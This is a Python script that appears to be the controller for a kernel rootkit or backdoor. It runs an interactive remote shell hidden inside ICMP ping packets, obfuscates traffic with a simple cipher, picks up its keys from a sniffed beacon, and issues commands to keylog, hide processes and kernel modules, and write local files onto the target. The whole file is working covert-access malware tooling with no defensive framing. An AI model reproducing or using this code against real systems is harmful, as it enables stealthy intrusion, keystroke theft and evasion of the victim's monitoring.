import sys
from scapy.all import sr1, IP, ICMP, sniff

COMMANDS = [
    "mycat", "keylog",
     "hide", "unhide",
      "hidemod", "unhidemod",
       "randswitch", "writefile"
       ]

PWD = "/"

P = 1
Q = 0
P_inv = 1


def encode(message):
    new_chars = []
    for c in message:
        new_chars.append(chr((P * ord(c) + Q) % 256))
    return "".join(new_chars)


def decode(message):
    new_chars = []
    for c in message:
        new_chars.append(chr((P_inv * (c - Q)) % 256))
    return "".join(new_chars)


def run_shell(ip):
    while True:
        try:
            command = input(f"{PWD} $ ")
            print(command)
            if not send_request(ip, command):
                print("Shell: something wrong, got no response")
        except KeyboardInterrupt:
            return


def send_request(ip, payload):
    command = payload.split()[0] 
    if command == "myecho":
        payload = payload[len(command) + 1:]
    elif command == "sendfile":
        args = payload.split(" ")
        if len(args) != 3:
            print("sendfile got invalid number of args")
            return True
        try:
            with open(args[2]) as f:
                args[2] = f.read()
            args[0] = "writefile"
            payload = " ".join(args)
        except IOError:
            return True

    elif command not in COMMANDS:
        payload = "shell " + payload
    
    if command != "myecho":
        payload = bytes([ord(c) for c in encode(payload)])

    
    response = sr1(IP(dst=ip)/ICMP()/payload, timeout=1, verbose=0)
    if response is not None:
        if command == "myecho":
            message = bytes(response[ICMP].payload).decode()
        else:
            res = bytes(response[ICMP].payload)
            start = 0
            while res[start] == 0:
                start += 1
            end = len(res) - 1
            while res[end] == 0:
                end -= 1
            message = decode(res[start:end+1])

        if command != "myecho" and command not in COMMANDS:
            message = message.strip("\x00").strip()
            global PWD
            PWD = message.split("\n")[-1]
            message = "\n".join(message.split("\n")[:-1])
        print(message, end="\n")
    return response is not None



def main():
    global P, Q, P_inv
    if len(sys.argv) != 2:
        while True:
            packet = sniff(count=1)[0].getlayer(ICMP)
            if packet is None:
                continue
            ip, P, Q, P_inv = bytes(packet.payload).decode().strip("\x00").strip().split()
            P = int(P)
            Q = int(Q)
            P_inv = int(P_inv)
            print(ip, P, Q, P_inv)
            break
    else:
        ip = sys.argv[1]
    print(ip)
    if not send_request(ip, "myecho test_echo"):
        print("Shell: test command got no response, exiting...")
        return
    run_shell(ip)
    print("Shell: keyboard interrupt, exiting...")


if __name__ == "__main__":
    main()
